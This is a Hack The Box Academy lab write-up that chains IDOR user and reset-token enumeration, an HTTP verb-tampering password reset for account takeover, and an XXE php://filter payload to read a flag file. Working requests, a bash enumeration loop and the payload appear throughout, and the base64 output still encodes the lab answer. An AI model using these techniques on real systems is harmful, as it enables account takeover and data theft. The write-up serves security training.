# Web Attacks — Skills Assessment

**Platform:** Hack The Box Academy  
**Module:** Web Attacks  
**Assessment:** Skills Assessment  
**Difficulty:** Medium  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Attack Chain Summary

| Step | Attack Type | Technique | Outcome |
|------|------------|-----------|----------|
| 1 | IDOR (Info Disclosure) | GET `/api.php/user/74` → enumerate UIDs 1–100 | Admin user `a.corrales` (uid=52) discovered |
| 2 | IDOR (Info Disclosure) | GET `/api.php/token/74` → modify to `/api.php/token/52` | Reset token for uid=52 recovered |
| 3 | HTTP Verb Tampering | POST `/reset.php` → `Access Denied` → switch to GET with URL params | Admin password reset succeeded |
| 4 | Login as admin | Credentials `a.corrales:<reset_password>` | Admin dashboard with "ADD EVENT" feature unlocked |
| 5 | XXE Injection | `addEvent.php` — XML POST body — inject PHP filter entity | `/flag.php` read as base64 via XXE |
| 6 | Base64 Decode | `echo '<base64>' \| base64 -d` | Flag captured from decoded PHP source |

---

## Network Topology

```
[Attack Host: 10.10.16.36]
        ↓ Browser with DevTools Network tab open
[Target: 10.129.43.173:PORT]
  └── /api.php/user/{uid}      ← IDOR — GET returns any user's data
  └── /api.php/token/{uid}     ← IDOR — GET returns any user's reset token
  └── /reset.php               ← Verb Tampering — GET bypasses POST access control
  └── /addEvent.php            ← XXE — XML POST body processes external entities
  └── /flag.php                ← Target — read via XXE PHP filter
```

---

## Question 1 — Escalate Privileges and Read /flag.php

**Question:** "Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'."

---

### Step 1 — Login and Identify the First IDOR

Navigate to `http://10.129.43.173:PORT` and log in with:

```
Username: htb-student
Password: Academy_student!
```

Open Firefox DevTools (`F12`) → **Network** tab before logging in, so all requests are captured from the start.

After login, the application's Network tab reveals a GET request fired automatically to populate the current user's info:

```http
GET /api.php/user/74 HTTP/1.1
Host: 10.129.43.173:PORT
Cookie: PHPSESSID=<session>
```

The response contains the current user's data:

```json
{
    "uid": "74",
    "username": "htb-student",
    "full_name": "HTB Student",
    "company": "Academy"
}
```

The endpoint uses a numeric UID directly in the URL path — a classic IDOR indicator. Changing `74` to `75` in the Network tab's request editor returns a different user's data with no error — the API has no access control on the back-end.

---

### Step 2 — Mass Enumerate Users to Find Admin (uid=52)

Write a bash script to fuzz UIDs 1–100 and pipe through `grep` to find privileged accounts:

```bash
Hackerpatel007_1@htb[/htb]$ cat fuzz.sh
```

```bash
#!/bin/bash

for uid in {1..100}; do
    curl -s "http://10.129.43.173:PORT/api.php/user/$uid"; echo
done
```

```bash
Hackerpatel007_1@htb[/htb]$ bash fuzz.sh | grep -i "admin" | jq .
```

```json
{
  "uid": "52",
  "username": "a.corrales",
  "full_name": "Amor Corrales",
  "company": "Administrator"
}
```

User `a.corrales` with uid=52 holds the `Administrator` company field — the target account to take over. The password is not returned — a separate attack is needed to reset it.

---

### Step 3 — Identify the Password Reset Flow

Navigate to the **Settings** page and initiate a password change. The Network tab shows the web application first fetches a token before sending the reset:

```http
GET /api.php/token/74 HTTP/1.1
```

Response:

```json
{
    "token": "e51a8a14-17ac-11ec-8e67-a3c050fe0c26"
}
```

The reset flow requires three parameters: `uid`, `token`, and `password`. The token endpoint uses the same UID-in-path pattern as the user endpoint — another IDOR.

---

### Step 4 — Steal the Reset Token for uid=52

Modify the token request to target uid=52 instead of uid=74:

```http
GET /api.php/token/52 HTTP/1.1
Host: 10.129.43.173:PORT
Cookie: PHPSESSID=<session>
```

Response:

```json
{
    "token": "e51a85fa-17ac-11ec-8e51-e78234eb7b0c"
}
```

The token for `a.corrales` (uid=52) is recovered — no authentication check on token retrieval. We now have all three components needed for the password reset:

| Parameter | Value |
|-----------|-------|
| `uid` | `52` |
| `token` | `e51a85fa-17ac-11ec-8e51-e78234eb7b0c` |
| `password` | Any strong password (e.g., generated with `openssl rand -hex 16`) |

---

### Step 5 — Attempt POST Password Reset — Access Denied

Intercept the normal password change request and modify the parameters for uid=52:

```http
POST /reset.php HTTP/1.1
Host: 10.129.43.173:PORT
Cookie: PHPSESSID=<session>

uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=f0e18de14fdadfc38350d97ff7284a25
```

Response:

```
Access Denied
```

The back-end is comparing the `PHPSESSID` against the `uid` being sent — it detects that uid=52 does not belong to the current session (uid=74). Standard POST is blocked.

---

### Step 6 — Bypass Access Control via HTTP Verb Tampering

The POST handler performs a session-uid validation, but the GET handler may not. Convert the POST request to a GET request by moving all parameters into the URL:

```http
GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=f0e18de14fdadfc38350d97ff7284a25 HTTP/1.1
Host: 10.129.43.173:PORT
Cookie: PHPSESSID=<session>
```

Response:

```
Password reset successful.
```

The GET handler for `reset.php` does not perform the same session-uid validation as the POST handler — a textbook Insecure Coding Verb Tampering vulnerability. The password for `a.corrales` is now set to `f0e18de14fdadfc38350d97ff7284a25`.

> **Why this works:** The developer applied the access control check only to the POST branch of `reset.php`. The GET branch was likely left for testing or legacy compatibility — but it performs the same database operation without the ownership check.

---

### Step 7 — Login as a.corrales

Log out and log back in with the newly set credentials:

```
Username: a.corrales
Password: f0e18de14fdadfc38350d97ff7284a25
```

The admin dashboard is noticeably different from the standard user view — a new **"ADD EVENT"** button is available, indicating elevated functionality.

---

### Step 8 — Discover XXE in the Add Event Feature

Click **ADD EVENT** and fill in dummy values for the event fields. With DevTools Network tab open, submit the form and inspect the POST request to `addEvent.php`:

```http
POST /addEvent.php HTTP/1.1
Host: 10.129.43.173:PORT
Content-Type: text/xml
Cookie: PHPSESSID=<admin_session>

<?xml version="1.0" encoding="UTF-8"?>
<root>
    <name>test event</name>
    <details>test details</details>
    <date>2021-09-22</date>
</root>
```

The application sends the form data as raw XML — and the `Content-Type: text/xml` header confirms the back-end parses it as XML. This is a potential XXE injection point.

---

### Step 9 — Inject XXE Payload to Read /flag.php

The flag is at `/flag.php` — a PHP file. Direct file reading via `file:///flag.php` would fail because PHP source code contains characters (`<`, `>`, `$`, `?`) that break XML parsing. Use the `php://filter/convert.base64-encode` wrapper to encode the file before embedding it in the XML response:

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>test</details>
    <date>2021-09-22</date>
</root>
```

**How this payload works:**

1. The `<!DOCTYPE replace [...]>` block injects a custom DTD inline
2. `<!ENTITY xxe SYSTEM ...>` defines an external entity pointing to `/flag.php` via PHP's base64 filter
3. The filter reads `/flag.php` and base64-encodes its content — making it XML-safe (no special characters)
4. `&xxe;` in the `<name>` field references the entity — the parser substitutes it with the base64-encoded file content
5. The `<name>` field value is reflected in the HTTP response — returning the encoded content

**Send the modified request in Burp Repeater:**

```http
POST /addEvent.php HTTP/1.1
Host: 10.129.43.173:PORT
Content-Type: text/xml
Cookie: PHPSESSID=<admin_session>

<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>test</details>
    <date>2021-09-22</date>
</root>
```

**Response:**

```
PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K
```

The base64-encoded content of `/flag.php` is returned in the response.

---

### Step 10 — Decode the Base64 to Retrieve the Flag

```bash
Hackerpatel007_1@htb[/htb]$ echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
```

```
<?php $flag = "HTB{flag_redacted}"; ?>
```

> **Answer:** `HTB{flag_redacted}`

---

## Flags

| Question | Description | Answer |
|----------|-------------|--------|
| Q1 — /flag.php contents | Flag extracted from PHP source via chained IDOR + Verb Tampering + XXE | `HTB{flag_redacted}` |

---

## Lessons Learned

- **API endpoints with numeric IDs in the URL path are always worth testing for IDOR.** The pattern `/api.php/user/74` is a direct object reference. If changing the number returns a different user's data without any access denied response, the back-end has no ownership validation — mass enumeration is the immediate next step.

- **Mass enumeration with bash loops is more effective than manual testing.** A `for uid in {1..100}` loop with `grep` for keywords like "admin", "Administrator", or role names surfaces privileged accounts in seconds — no Burp Intruder or ZAP Fuzzer needed for simple numeric ID enumeration.

- **Token endpoints are frequently vulnerable to the same IDOR as user endpoints.** Developers often secure the user data endpoint but forget that adjacent endpoints (`/api.php/token/74`) follow the same insecure pattern. Always check all API endpoints for IDOR, not just the one where data is visually exposed.

- **Access Denied on POST does not mean the endpoint is protected.** When a POST handler validates session ownership but a GET handler on the same path does not, switching to GET with URL parameters bypasses the entire check. Always test all HTTP verbs on endpoints that return access control errors.

- **XML form fields are an overlooked XXE attack surface.** Most testers look for SQLi and XSS on form inputs. When `Content-Type: text/xml` appears in a POST request, XXE becomes the primary test. The `<name>&xxe;</name>` pattern identifies which field reflects entity values — that field becomes the exfiltration channel.

- **PHP filter `php://filter/convert.base64-encode` is essential for reading PHP source files.** Raw `file:///flag.php` would fail because PHP's `<?php ... ?>` delimiters contain characters that break XML. The base64 filter encodes the file entirely — bypassing XML's character restrictions and delivering the content safely in the response.

- **Chaining multiple web vulnerabilities dramatically expands impact.** This assessment required three distinct attack types in sequence — IDOR to find the target user and steal their token, Verb Tampering to bypass the POST access control on the password reset, and XXE to finally read the flag. Each vulnerability alone would not have been sufficient — the chain was the key.

---

## Full Attack Chain Reference

```
Login: htb-student:Academy_student!
        ↓
DevTools Network → GET /api.php/user/74 → uid=74 is current user
        ↓
Change uid to 75 → different user returned → IDOR confirmed
        ↓
bash fuzz.sh | grep -i "admin" | jq .
→ uid=52, username=a.corrales, company=Administrator
        ↓
GET /api.php/token/52 → token: e51a85fa-17ac-11ec-8e51-e78234eb7b0c
        ↓
POST /reset.php uid=52&token=...&password=f0e18de14fdadfc38350d97ff7284a25
→ Access Denied (session-uid mismatch check on POST)
        ↓
GET /reset.php?uid=52&token=...&password=f0e18de14fdadfc38350d97ff7284a25
→ Password reset successful (GET handler has no ownership check)
        ↓
Login: a.corrales:f0e18de14fdadfc38350d97ff7284a25
→ Admin dashboard with ADD EVENT feature
        ↓
ADD EVENT → POST /addEvent.php → Content-Type: text/xml → XML body
        ↓
Inject: <!DOCTYPE replace [<!ENTITY xxe SYSTEM
"php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root><name>&xxe;</name>...</root>
        ↓
Response: PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K
        ↓
echo '<base64>' | base64 -d
→ <?php $flag = "HTB{flag_redacted}"; ?>
```

---

## Commands Reference

| Command | Purpose |
|---------|----------|
| `curl -s "http://TARGET/api.php/user/$uid"` | Fetch single user data via IDOR-vulnerable endpoint |
| `for uid in {1..100}; do curl -s "http://TARGET/api.php/user/$uid"; echo; done` | Mass enumerate users by UID |
| `bash fuzz.sh \| grep -i "admin" \| jq .` | Filter enumeration output for admin accounts |
| `curl -s "http://TARGET/api.php/token/52"` | Steal reset token for target UID via IDOR |
| `openssl rand -hex 16` | Generate strong random password for account takeover |
| `GET /reset.php?uid=52&token=...&password=...` | HTTP Verb Tampering — bypass POST access control via GET |
| `echo 'PD9waHAg...' \| base64 -d` | Decode base64-encoded PHP source from XXE response |
| `php://filter/convert.base64-encode/resource=/flag.php` | PHP filter wrapper to safely exfiltrate PHP files via XXE |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1213 | — | Data from Information Repositories — IDOR GET `/api.php/user/{uid}` leaking all user data |
| T1078 | T1078.003 | Valid Accounts: Local Accounts — password reset takeover of `a.corrales` admin account |
| T1548 | T1548.002 | Abuse Elevation Control Mechanism — HTTP Verb Tampering GET bypass of POST session-uid check |
| T1190 | — | Exploit Public-Facing Application — XXE injection via XML POST body in `addEvent.php` |
| T1083 | — | File and Directory Discovery — XXE reading `/flag.php` via PHP filter wrapper |
| T1005 | — | Data from Local System — PHP source code exfiltrated via XXE base64 encode filter |
| T1071 | T1071.001 | Application Layer Protocol: Web Protocols — all attacks over HTTP/HTTPS |

---

*Part of the HTB Academy CPTS path — Web Attacks module.*  
*Penetration Tester role in India | Target: January 2027*
